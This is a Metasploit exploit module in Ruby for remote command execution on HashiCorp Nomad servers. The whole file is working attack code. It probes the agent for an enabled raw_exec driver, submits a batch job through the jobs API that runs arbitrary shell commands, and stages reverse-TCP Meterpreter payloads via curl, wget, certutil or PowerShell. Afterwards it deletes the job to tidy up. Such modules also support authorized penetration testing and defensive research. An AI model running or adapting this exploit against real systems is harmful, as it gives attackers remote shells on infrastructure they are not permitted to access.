##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::CmdStager

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'HashiCorp Nomad Remote Command Execution',
        'Description' => %q{
          Create a batch job on HashiCorp's Nomad server to spawn a shell
        },
        'License' => MSF_LICENSE,
        'Author' =>
          [
            'Wyatt Dahlenburg (@wdahlenb)',
          ],
        'References' =>
          [
            [ 'URL', 'https://www.nomadproject.io/' ]
          ],
        'Targets' =>
          [
            [
              'Linux',
              {
                'Platform' => 'linux',
                'CmdStagerFlavor' => ['bourne', 'echo', 'printf', 'curl', 'wget'],
                'DefaultOptions' => { 'PAYLOAD' => 'linux/x86/meterpreter/reverse_tcp' }
              }
            ],
            [
              'Windows',
              {
                'Platform' => 'win',
                'CmdStagerFlavor' => [ 'psh_invokewebrequest', 'certutil', 'vbs' ],
                'DefaultOptions' => { 'PAYLOAD' => 'windows/meterpreter/reverse_tcp' }
              }
            ]
          ],
        'Payload' => {},
        'Privileged' => false,
        'DefaultTarget' => 0,
        'DisclosureDate' => '2021-05-17'
      )
    )
    register_options(
      [
        OptString.new('TARGETURI', [true, 'The base path', '/']),
        OptBool.new('SSL', [false, 'Negotiate SSL/TLS for outgoing connections', false]),
        OptString.new('ACL_TOKEN', [false, 'Consul Agent ACL token', '']),
        Opt::RPORT(4646)
      ]
    )
  end

  def check
    res = send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, '/v1/agent/self'),
      'headers' => {
        'X-Nomad-Token' => datastore['ACL_TOKEN']
      }
    })

    unless res
      vprint_error 'Connection failed'
      return CheckCode::Unknown
    end

    unless res.code == 200
      vprint_error 'Unexpected reply'
      return CheckCode::Safe
    end

    agent_info = JSON.parse(res.body)

    if agent_info['config']['Client']['Options']['driver.raw_exec.enable'] == 'true'
      return CheckCode::Vulnerable
    end

    CheckCode::Safe
  rescue JSON::ParserError
    vprint_error 'Failed to parse JSON output.'
    return CheckCode::Unknown
  end

  def execute_command(cmd, _opts = {})
    uri = target_uri.path
    job_name = Rex::Text.rand_text_alpha(5..10)
    print_status("Creating job '#{job_name}'")

    # NOTE: Timeout defines how much time the check script will run until
    # getting killed. Arbitrarily set to one day for now.
    case target.name
    when /Linux/
      arg1 = 'sh'
      arg2 = '-c'
    when /Windows/
      arg1 = 'cmd.exe'
      arg2 = '/c'
    end
    res = send_request_cgi({
      'method' => 'PUT',
      'uri' => normalize_uri(uri, 'v1/jobs'),
      'headers' => {
        'X-Nomad-Token' => datastore['ACL_TOKEN']
      },
      'ctype' => 'application/json',
      'data' => {
        Job: {
          ID: job_name,
          Name: job_name,
          Type: 'batch',
          Datacenters: ['dc1'],
          TaskGroups: [
            {
              Name: job_name,
              Count: 1,
              Tasks: [
                {
                  Name: 'rce',
                  Driver: 'raw_exec',
                  User: '',
                  Config: {
                    command: arg1,
                    args: [
                      arg2,
                      cmd.to_s
                    ]
                  },
                  Resources: {
                    CPU: 500,
                    MemoryMB: 256
                  },
                  LogConfig: {
                    MaxFiles: 1,
                    MaxFileSizeMB: 1
                  }
                }
              ],
              RestartPolicy: {
                Attempts: 0
              },
              EphemeralDisk: {
                SizeMB: 300
              }
            }
          ]
        }
      }.to_json
    })
    unless res && res.code == 200
      fail_with(Failure::UnexpectedReply, 'An error occured when contacting the Nomad API.')
    end

    job_info = JSON.parse(res.body)
    eval_id = job_info['EvalID']

    print_status("Job '#{job_name}' successfully created as '#{eval_id}'.")
    print_status("Waiting for job '#{job_name}' to trigger")
    sleep(12)
    print_status("Removing job '#{job_name}'")
    res = send_request_cgi({
      'method' => 'DELETE',
      'uri' => normalize_uri(
        uri,
        "v1/job/#{job_name}"
      ),
      'headers' => {
        'X-Nomad-Token' => datastore['ACL_TOKEN']
      }
    })
    if res && res.code != 200
      fail_with(Failure::UnexpectedReply,
                'An error occured when contacting the Nomad API.')
    end
  end

  def exploit
    execute_cmdstager
  end
end
